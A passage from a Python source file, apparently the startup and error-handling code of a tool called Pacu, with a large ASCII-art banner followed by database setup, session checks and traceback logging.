                                                                   ..,**//**,..                     /&&&&&&&&&&&&&&&&&&(
                                    .,*/##%%&&&&&&&&&%%#(*,*#%&&&&&&&&&&&&&&&&&&&&&%(*.             .%&&&&&&&&&&&&&&&&&&&/
                                                  .,/#%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,         ,&&&&/        .#&&&&&&
                                             ........    ,%&&&&&&&&&&&&&&&&&&&. .*#%&&&&&&&&&%,                      .&&&&&/
                                   .*/////((##%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.      .*#&&&&&&&.                    (&&&&%
                                                  .#&&&&&&&&&&&&&&&&&&&&&&&&&&&.     .*#&&&&&&&&&&&*                  .&&&&&*
                                      .*#%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*                ,&&&&&&%(
                                             *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/,.                         *&&&&&&&&&&&/
                                     .*#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%/.   .,/#%&&&&&&.                  .(%%&&&&&&&&&*
                                          (&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   ./#&&&&&&%%&&&&(                         ,#&&&&&&%.
                                        /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&(.  ./%&&&&&%&&&&  (&/                             *&&&&&&/
                                       ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,  .(&&&&&&&&%. %&&&,   .                                (&&&&&*
                                      *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/   .%&&&&&//&&&&%    *.                                      /&&&&&
                                     .%&&&&&&&&&&&&&&&&&&&&&&&&&&&&(   *&&&&&&&&(   #&/                                             &&&&&.
                          *(#%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   *&&&&.*%&&&/                                                   &&&&&,
                    *%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/    (&&&&&.    *                                                    &&&&&,
                 ,%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&         ./%                                                           .&&&&&.
                       ,#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                                                                       %&&&&%
                          .(&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%.                                                                     .%&&&&&,
                              *&&&&&&&&&&&&&&&&&&&&&&&&&&%.                                                                    *&&&&&&%.
                             .(&&&&&&&&&&&&&&&&&&&&&&&&&&&                                  .                            .*#&&&&&&&/
                            (&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.                 (&/    (&.    &&,     %&&&&&&&&&&&&&&&&&&&&&&&&&&&&%
                          .&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,           .&&&&% /&&&&/  #&&&/    %&&&&&&&&&&&&&&&&&&&&&&&&,
                          #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%#/,,,,*&&&&&&&&&&%&&&&&    %&&&&&&&&&&&&&&&&&&&%#(*.
                          &&&&&&&&&&/
                         .&&&&&&&%,   (%%%%%%%%%%%%%%##*          *##%%%%%%%%%%%##*         ,(#%%%%%%%%%%%##,      .#%%%%%%.      #%%%%%%,
                         .&&&&.       #&&&&&&&&&&&&&&&&&&&,     ,&&&&&&&&&&&&&&&&&&&*     *&&&&&&&&&&&&&&&&&&&(    .&&&&&&&,     .%&&&&&&*
                          &&&%.       #&&&&&&&&&&&&&&&&&&&&,   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&/   .&&&&&&&,     .%&&&&&&*
                          %&*         #&&&&&&&&&&&&&&&&&&&&&   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     ,#######*   .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&&&&&&&&&&&&&&&&   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&&&&&&&&&&&&&&&%   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&&&&&&&&&&&&&&%.   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&&&&&&&&&&,        .&&&&&&&%%%%%%%&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&(   .&&&&&&&&&&&&&&&&&&&&&*
                                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&(    %&&&&&&&&&&&&&&&&&&&&,
                                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   .&&&&&&&&&&&&&&&&&&&&&*    ,&&&&&&&&&&&&&&&&&&&%
                                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,     *%&&&&&&&&&&&&&&&&/        /%&&&&&&&&&&&&&&(.

                """)
                configure_settings.copy_settings_template_into_settings_file_if_not_present()
                set_sigint_handler(exit_text='\nA database must be created for Pacu to work properly.')
                setup_database_if_not_present(settings.DATABASE_FILE_PATH)
                set_sigint_handler(exit_text=None, value='SIGINT called')

                database = get_database_connection(settings.DATABASE_CONNECTION_PATH)

                check_sessions(database)

                initialize_tab_completion()
                display_help()

                idle_ready = True

            idle(database)

        except (Exception, SystemExit) as error:
            exception_type, exception_value, tb = sys.exc_info()

            if exception_type == SystemExit:
                if 'SIGINT called' in exception_value.args:
                    print('\nBye!')
                    return
                else:
                    traceback_text = '\nTraceback (most recent call last):\n{}{}: {}\n\n'.format(''.join(traceback.format_tb(tb)), str(exception_type), str(exception_value))
                    session, global_data, local_data = get_data_from_traceback(tb)
                    util.log_error(
                        traceback_text,
                        exception_info=f'{exception_type}: {exception_value}\n\nPacu caught a SystemExit error. This may be due to incorrect module arguments received by argparse in the module itself. Check to see if any required arguments are not being received by the module when it executes.',
                        session=session,
                        local_data=local_data,
                        global_data=global_data
                    )
            else:
                traceback_text = '\nTraceback (most recent call last):\n{}{}: {}\n\n'.format(''.join(traceback.format_tb(tb)), str(exception_type), str(exception_value))
                session, global_data, local_data = get_data_from_traceback(tb)
                util.log_error(
                    traceback_text,
                    exception_info=f'{exception_type}: {exception_value}',
                    session=session,
                    local_data=local_data,
                    global_data=global_data
                )

            if not idle_ready:
                print('Pacu is unable to start. Try copying Pacu\'s sqlite.db file and deleting the old version. If the error persists, try reinstalling Pacu in a new directory.')
                return


if __name__ == '__main__':
    main()
